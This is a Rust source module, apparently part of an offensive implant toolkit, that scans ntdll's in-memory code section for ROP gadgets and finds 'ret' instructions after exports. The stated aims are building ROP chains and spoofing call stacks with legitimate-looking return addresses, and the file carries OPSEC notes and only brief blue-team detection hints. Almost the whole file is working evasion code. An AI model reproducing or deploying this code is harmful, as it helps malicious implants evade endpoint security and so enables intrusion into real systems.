//! ROP gadget discovery for ntdll and system DLLs
//!
//! Scans loaded DLLs to find useful instruction sequences (gadgets)
//! for ROP chains and stack spoofing.
//!
//! ## OPSEC Considerations
//! - One-time scan at startup, no repeated pattern scanning
//! - Uses already-loaded DLLs (no additional loads)
//! - Gadget addresses cached in memory
//!
//! ## Detection (Blue Team)
//! - Memory scanning for arrays of addresses pointing into ntdll .text
//! - Unusual access patterns to ntdll code section
//! - ROP chain signatures in process memory

#[cfg(target_os = "windows")]
use super::unhook::pe::{find_text_section, get_module_base, get_proc_address};

/// Cached ROP gadgets from ntdll
#[cfg(target_os = "windows")]
#[derive(Debug, Clone)]
pub struct GadgetCache {
    /// pop rcx; ret (0x59 0xC3)
    pub pop_rcx_ret: Option<usize>,
    /// pop rdx; ret (0x5A 0xC3)
    pub pop_rdx_ret: Option<usize>,
    /// pop r8; ret (0x41 0x58 0xC3)
    pub pop_r8_ret: Option<usize>,
    /// pop r9; ret (0x41 0x59 0xC3)
    pub pop_r9_ret: Option<usize>,
    /// ret (0xC3)
    pub ret: Option<usize>,
    /// add rsp, X; ret pattern
    pub add_rsp_ret: Option<usize>,
    /// jmp rax (0xFF 0xE0)
    pub jmp_rax: Option<usize>,
}

#[cfg(target_os = "windows")]
impl GadgetCache {
    /// Build gadget cache by scanning ntdll
    pub fn build() -> Self {
        let mut cache = Self {
            pop_rcx_ret: None,
            pop_rdx_ret: None,
            pop_r8_ret: None,
            pop_r9_ret: None,
            ret: None,
            add_rsp_ret: None,
            jmp_rax: None,
        };

        if let Some(ntdll) = get_module_base("ntdll.dll") {
            if let Some(text_section) = unsafe { find_text_section(ntdll) } {
                let text_start = ntdll as usize + text_section.virtual_address as usize;
                let text_size = text_section.virtual_size as usize;

                unsafe {
                    cache.scan_for_gadgets(text_start, text_size);
                }
            }
        }

        cache
    }

    /// Scan memory range for useful gadgets
    #[cfg(target_os = "windows")]
    unsafe fn scan_for_gadgets(&mut self, base: usize, size: usize) {
        let ptr = base as *const u8;

        // Don't scan the last few bytes to avoid overread
        let scan_limit = size.saturating_sub(4);

        for offset in 0..scan_limit {
            let addr = ptr.add(offset);

            // pop rcx; ret (0x59 0xC3)
            if self.pop_rcx_ret.is_none()
                && *addr == 0x59
                && *addr.add(1) == 0xC3
            {
                self.pop_rcx_ret = Some(base + offset);
            }

            // pop rdx; ret (0x5A 0xC3)
            if self.pop_rdx_ret.is_none()
                && *addr == 0x5A
                && *addr.add(1) == 0xC3
            {
                self.pop_rdx_ret = Some(base + offset);
            }

            // pop r8; ret (0x41 0x58 0xC3)
            if self.pop_r8_ret.is_none()
                && *addr == 0x41
                && *addr.add(1) == 0x58
                && *addr.add(2) == 0xC3
            {
                self.pop_r8_ret = Some(base + offset);
            }

            // pop r9; ret (0x41 0x59 0xC3)
            if self.pop_r9_ret.is_none()
                && *addr == 0x41
                && *addr.add(1) == 0x59
                && *addr.add(2) == 0xC3
            {
                self.pop_r9_ret = Some(base + offset);
            }

            // Simple ret (0xC3)
            if self.ret.is_none() && *addr == 0xC3 {
                self.ret = Some(base + offset);
            }

            // jmp rax (0xFF 0xE0)
            if self.jmp_rax.is_none()
                && *addr == 0xFF
                && *addr.add(1) == 0xE0
            {
                self.jmp_rax = Some(base + offset);
            }

            // add rsp, 0x??; ret (0x48 0x83 0xC4 0x?? 0xC3)
            if self.add_rsp_ret.is_none()
                && *addr == 0x48
                && *addr.add(1) == 0x83
                && *addr.add(2) == 0xC4
                && *addr.add(4) == 0xC3
            {
                self.add_rsp_ret = Some(base + offset);
            }

            // Early exit if we found all gadgets
            if self.pop_rcx_ret.is_some()
                && self.pop_rdx_ret.is_some()
                && self.pop_r8_ret.is_some()
                && self.pop_r9_ret.is_some()
                && self.ret.is_some()
                && self.jmp_rax.is_some()
                && self.add_rsp_ret.is_some()
            {
                break;
            }
        }
    }

    /// Check if we have the minimum required gadgets
    pub fn has_required_gadgets(&self) -> bool {
        self.pop_rcx_ret.is_some()
            && self.pop_rdx_ret.is_some()
            && self.ret.is_some()
    }
}

/// Find a 'ret' (0xC3) instruction after an export
/// Used for building legitimate-looking return addresses
#[cfg(target_os = "windows")]
pub fn find_ret_after(module_name: &str, export_name: &str) -> Option<usize> {
    let module_base = get_module_base(module_name)?;
    let export_addr = get_proc_address(module_base, export_name)? as usize;

    // Scan forward for ret instruction (limit to reasonable function size)
    for offset in 0..0x200 {
        let addr = export_addr + offset;
        if unsafe { *(addr as *const u8) } == 0xC3 {
            return Some(addr);
        }
    }

    // Fallback to export itself (not ideal but works)
    Some(export_addr)
}

/// Find ret gadget in a specific module at any location
#[cfg(target_os = "windows")]
pub fn find_any_ret(module_name: &str) -> Option<usize> {
    let module_base = get_module_base(module_name)?;
    let text_section = unsafe { find_text_section(module_base)? };

    let text_start = module_base as usize + text_section.virtual_address as usize;
    let text_size = text_section.virtual_size as usize;

    // Find first ret in the text section
    for offset in 0..text_size {
        let addr = text_start + offset;
        if unsafe { *(addr as *const u8) } == 0xC3 {
            return Some(addr);
        }
    }

    None
}

// Non-Windows stubs
#[cfg(not(target_os = "windows"))]
#[derive(Debug, Clone)]
pub struct GadgetCache;

#[cfg(not(target_os = "windows"))]
impl GadgetCache {
    pub fn build() -> Self {
        Self
    }

    pub fn has_required_gadgets(&self) -> bool {
        false
    }
}

#[cfg(not(target_os = "windows"))]
pub fn find_ret_after(_module_name: &str, _export_name: &str) -> Option<usize> {
    None
}

#[cfg(not(target_os = "windows"))]
pub fn find_any_ret(_module_name: &str) -> Option<usize> {
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gadget_cache_build() {
        let cache = GadgetCache::build();
        // On non-Windows, this will be empty
        #[cfg(not(target_os = "windows"))]
        assert!(!cache.has_required_gadgets());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_find_ret_after_non_windows() {
        assert!(find_ret_after("ntdll.dll", "NtClose").is_none());
        assert!(find_any_ret("ntdll.dll").is_none());
    }
}
